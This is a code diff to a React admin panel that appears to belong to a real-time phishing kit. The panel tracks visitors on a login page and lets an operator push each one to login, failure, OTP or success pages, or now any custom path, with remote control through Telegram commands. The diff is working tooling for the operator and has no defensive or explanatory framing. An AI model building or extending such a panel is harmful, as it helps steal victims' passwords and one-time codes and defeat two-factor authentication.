@@ -5,6 +5,7 @@ import type { Visitor } from "@shared/schema";
 export default function Admin() {
   const [password, setPassword] = useState("");
   const [authToken, setAuthToken] = useState<string | null>(null);
+  const [customPages, setCustomPages] = useState<Record<string, string>>({});
   const queryClient = useQueryClient();
 
   // Authenticate with password via server
@@ -76,6 +77,20 @@ export default function Admin() {
     if (confirm(`Redirect this visitor to ${page}?`)) {
       redirectMutation.mutate({ sessionId, redirectTarget: page });
     }
+  };
+
+  const handleCustomRedirect = (sessionId: string, visitorId: number) => {
+    const customPage = customPages[visitorId];
+    if (!customPage) {
+      alert("Please enter a page path");
+      return;
+    }
+    if (!customPage.startsWith('/')) {
+      alert("Page path must start with /");
+      return;
+    }
+    redirectMutation.mutate({ sessionId, redirectTarget: customPage });
+    setCustomPages({ ...customPages, [visitorId]: "" }); // Clear after redirect
   };
 
   if (!authToken) {
@@ -151,35 +166,54 @@ export default function Admin() {
                       {new Date(visitor.lastSeen).toLocaleString()}
                     </td>
                     <td className="px-6 py-4 text-sm">
-                      <div className="flex flex-wrap gap-2">
-                        <button
-                          onClick={() => handleRedirect(visitor.sessionId, "/login")}
-                          className="px-3 py-1 bg-blue-500 text-white rounded text-xs hover:bg-blue-600"
-                          data-testid={`button-redirect-login-${visitor.id}`}
-                        >
-                          → Login
-                        </button>
-                        <button
-                          onClick={() => handleRedirect(visitor.sessionId, "/login-failure")}
-                          className="px-3 py-1 bg-red-500 text-white rounded text-xs hover:bg-red-600"
-                          data-testid={`button-redirect-failure-${visitor.id}`}
-                        >
-                          → Failure
-                        </button>
-                        <button
-                          onClick={() => handleRedirect(visitor.sessionId, "/otp")}
-                          className="px-3 py-1 bg-green-500 text-white rounded text-xs hover:bg-green-600"
-                          data-testid={`button-redirect-otp-${visitor.id}`}
-                        >
-                          → OTP
-                        </button>
-                        <button
-                          onClick={() => handleRedirect(visitor.sessionId, "/success")}
-                          className="px-3 py-1 bg-purple-500 text-white rounded text-xs hover:bg-purple-600"
-                          data-testid={`button-redirect-success-${visitor.id}`}
-                        >
-                          → Success
-                        </button>
+                      <div className="space-y-2">
+                        <div className="flex flex-wrap gap-2">
+                          <button
+                            onClick={() => handleRedirect(visitor.sessionId, "/login")}
+                            className="px-3 py-1 bg-blue-500 text-white rounded text-xs hover:bg-blue-600"
+                            data-testid={`button-redirect-login-${visitor.id}`}
+                          >
+                            → Login
+                          </button>
+                          <button
+                            onClick={() => handleRedirect(visitor.sessionId, "/login-failure")}
+                            className="px-3 py-1 bg-red-500 text-white rounded text-xs hover:bg-red-600"
+                            data-testid={`button-redirect-failure-${visitor.id}`}
+                          >
+                            → Failure
+                          </button>
+                          <button
+                            onClick={() => handleRedirect(visitor.sessionId, "/otp")}
+                            className="px-3 py-1 bg-green-500 text-white rounded text-xs hover:bg-green-600"
+                            data-testid={`button-redirect-otp-${visitor.id}`}
+                          >
+                            → OTP
+                          </button>
+                          <button
+                            onClick={() => handleRedirect(visitor.sessionId, "/success")}
+                            className="px-3 py-1 bg-purple-500 text-white rounded text-xs hover:bg-purple-600"
+                            data-testid={`button-redirect-success-${visitor.id}`}
+                          >
+                            → Success
+                          </button>
+                        </div>
+                        <div className="flex gap-2 items-center">
+                          <input
+                            type="text"
+                            value={customPages[visitor.id] || ""}
+                            onChange={(e) => setCustomPages({ ...customPages, [visitor.id]: e.target.value })}
+                            placeholder="Custom path (e.g., /any-page)"
+                            className="flex-1 px-2 py-1 border rounded text-xs"
+                            data-testid={`input-custom-page-${visitor.id}`}
+                          />
+                          <button
+                            onClick={() => handleCustomRedirect(visitor.sessionId, visitor.id)}
+                            className="px-3 py-1 bg-gray-700 text-white rounded text-xs hover:bg-gray-800"
+                            data-testid={`button-redirect-custom-${visitor.id}`}
+                          >
+                            → Go
+                          </button>
+                        </div>
                       </div>
                     </td>
                   </tr>
@@ -199,9 +233,10 @@ export default function Admin() {
           <h2 className="text-xl font-bold mb-4">Instructions</h2>
           <ul className="list-disc list-inside space-y-2 text-gray-700">
             <li>Visitors are tracked automatically when they visit the login page</li>
-            <li>Click any redirect button to send a visitor to that page</li>
+            <li>Click any quick redirect button to send a visitor to that page</li>
+            <li>Use the custom input to redirect to ANY page path (e.g., /custom-page, /any/path)</li>
             <li>The visitor will be redirected within 2 seconds</li>
-            <li>Use Telegram commands to control visitors remotely</li>
+            <li>Use Telegram commands to control visitors remotely: <code>/redirect &lt;session&gt; &lt;page&gt;</code></li>
           </ul>
         </div>
       </div>
